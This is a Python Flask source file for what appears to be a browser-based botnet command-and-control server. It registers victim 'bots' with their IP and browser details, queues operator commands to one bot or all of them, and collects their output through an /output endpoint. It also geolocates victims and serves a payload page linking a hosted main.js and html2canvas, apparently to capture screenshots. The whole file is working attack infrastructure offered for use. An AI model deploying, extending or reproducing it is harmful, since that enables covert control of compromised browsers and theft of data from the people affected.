from flask import Flask, request, jsonify, render_template, redirect, session, send_from_directory, url_for
from functools import wraps
from flask_cors import CORS
from hashlib import sha256
import pprint
import time
import threading
import requests
from geopy.geocoders import Nominatim
import json

public = True

app = Flask(__name__)
app.secret_key = 'your_secret_key_here' # add a secret key for session management
CORS(app) # enable CORS for all routes
surl = None
if public == False:
    surl = "http://127.0.0.1:5000/static/js/main.js"
else:
    surl = "http://0.0.0.0:5000/static/js/main.js"


# a dictionary to store usernames and passwords



def load_config():
    with open("config.json", "r") as f:
        config = json.load(f)
    return config

def get_users(config):
    users = load_config()
    for user, password in users.items():
        users[user] = password
    return users

config = load_config()
users = get_users(config)
print(users)

outputs = []

@app.route('/main.js')
def serve_js():
    return send_from_directory(app.static_folder, 'js/main.js')

@app.route('/html2canvas.js')
def serve_js_canvas():
    return send_from_directory(app.static_folder, 'js/html2canvas.js')

# a decorator function to check if the user is logged in
def login_required(redirect_url='/login'):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if 'username' not in session:
                return redirect(redirect_url)
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# your existing dashboard route now requires the user to be logged in
@app.route('/dashboard')
@login_required(redirect_url='/login')
def dashboard():
    return render_template('dashboard.html', bots=bots)

@app.route('/payload')
@login_required(redirect_url='/login')
def payload():
    return render_template('payload.html', surl=surl)

@app.route("/")
def index():
    return redirect("/login")

@app.route('/result/<botname>')
@login_required(redirect_url='/login')
def result(botname):
    return render_template('results.html', bots=bots, botname=botname)

# a new login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in users and sha256(password.encode()).hexdigest() == users[username]:
            session['username'] = username # set the session variable
            return redirect('/dashboard')
        else:
            return 'Invalid username or password'
    else:
        return render_template('login.html')

# your existing logout route
@app.route('/logout')
def logout():
    session.pop('username', None) # remove the session variable
    return redirect('/login')

# the rest of your existing routes go here...

bots = {} # dictionary to keep track of active bots
botcmds = []


@app.route('/bot', methods=['GET'])
def register_bot():
    pprint.pprint(bots)
    bot_name = request.args.get('name')
    bot_ip = request.args.get('IP')
    if len(bot_ip) < 6:
        return 'ERROR'
    bot_browser = request.args.get('browser')
    bot_hsp = request.args.get('hsp')
    bot_from = request.args.get('from')
    if bot_name == "" or bot_ip == "" or bot_browser == "" or bot_hsp == "" or bot_from == "":
        return 'ERROR'
    bot_customhash = sha256(bytes(str(str(bot_name) + str(bot_ip) + str(bot_browser) + str(bot_hsp) + str(bot_from)), "utf-8")).hexdigest()
    if len(bot_customhash) < 60:
        while len(bot_customhash) < 60:
            bot_customhash = sha256(bytes(str(str(bot_name) + str(bot_ip) + str(bot_browser) + str(bot_hsp) + str(bot_from)), "utf-8")).hexdigest()
    try:
        if bots[bot_name] != None:
            bots[bot_name] = {
                'ip': bot_ip,
                'browser': bot_browser,
                'hsp': bot_hsp,
                'ch': bot_customhash,
                'from': bot_from,
                'last_heartbeat': time.time()
            }
            return 'Bot registered successfully'
        else:
            bots[bot_name] = {
                'ip': bot_ip,
                'browser': bot_browser,
                'hsp': bot_hsp,
                'ch': bot_customhash,
                'from': bot_from,
                'last_heartbeat': time.time()
            }
            return 'Bot registered successfully'
    except:
        bots[bot_name] = {
            'ip': bot_ip,
            'browser': bot_browser,
            'hsp': bot_hsp,
            'ch': bot_customhash,
            'from': bot_from,
            'last_heartbeat': time.time()
        }
        return 'Bot registered successfully'

@app.route('/bot/<bot_name>', methods=['GET'])
def check_messages(bot_name):
    global botcmds
    try:
        if str(bot_name) in bots:
            try:
                for i in range(0, len(botcmds)):
                    if botcmds[i][0] == bot_name:
                        cmd = botcmds[i][1]
                        del botcmds[i]
                        return cmd, 200
                    else:
                        return "Empty", 200
            except:
                return "Empty", 200
            return "Empty", 200
    except:
        return "Empty", 200
    return "Empty", 200

@app.route('/bot/<bot_name>/quit', methods=['POST'])   
def quit_bot(bot_name):
    print("quit_bot function called")
    if bot_name in bots:
        del bots[bot_name]
        return 'Bot quit successfully'
    else:
        return 'Bot not found'
    
@app.route('/bot/<bot_name>/postmessage/<comand>', methods=['GET'])   
@login_required(redirect_url='/login')
def broadcastcmds(bot_name, comand):
    global botcmds
    if bot_name != "ALL":
        if bot_name in bots:
            botcmds.append([bot_name, comand])
            pprint.pprint(botcmds)
            return "Command sent to bot " + bot_name
        else:
            return "Error: bot not found"
    else:
        try:
            for i in bots:
                botcmds.append([i, comand])
            pprint.pprint(botcmds)
            return "Command sent to all bots"
        except:
            return "Error: failed to send command to all bots"


@app.route("/output", methods=['POST'])
def deployout():
    requestData = request.get_json()
    botname = requestData['botname']
    data = requestData['data']
    tpe = requestData['cmdtype']
    if botname in bots:
        outputs.append({botname: {tpe: data}})
        return "OK", 200
    return "BAD", 404

@app.route("/output/<botname>")
@login_required(redirect_url='/login')
def get_output(botname):
    l = []
    if botname in bots:
        for out in outputs:
            if botname in out:
                l.append(out[botname])
    return jsonify(l)
    
@app.route('/bot/<bot_name>/heartbeat', methods=['GET'])
def heartbeat(bot_name):
    if bot_name in bots:
        bots[bot_name]['last_heartbeat'] = time.time()
        return 'Heartbeat received', 200
    else:
        return 'Bot not found', 404


@app.route('/ip_locations')
@login_required(redirect_url='/login')
def ip_locations():
    ips = []
    count = 0
    geolocator = Nominatim(user_agent='myapp') # Instantiate a geolocator
    try:
        for i in bots:
            count += 1
            if len(bots[i]["ip"]) > 5:
                iper = bots[i]["ip"]
                location = geolocator.geocode(iper) # Geocode the IP address
                if location:
                    lat = location.latitude
                    lon = location.longitude
                    ips.append([lat, lon])
                else:
                    pass
            else:
                pass
    except:
        return jsonify(ips), 200
    return jsonify(ips), 200

@app.route('/bots')
@login_required(redirect_url='/login')
def get_bots():
    return jsonify(bots)

def remove_inactive_bots():
    inactive_bots = []
    for bot_name in bots:
        if time.time() - bots[bot_name]['last_heartbeat'] > 5:
            inactive_bots.append(bot_name)
    for bot_name in inactive_bots:
        del bots[bot_name]

def start_heartbeat():
    while True:
        time.sleep(5)
        remove_inactive_bots()

if __name__ == '__main__':
    t = threading.Thread(target=start_heartbeat)
    t.start()
    if public == False:
        app.run(debug=True)
    else:
        app.run(host="0.0.0.0")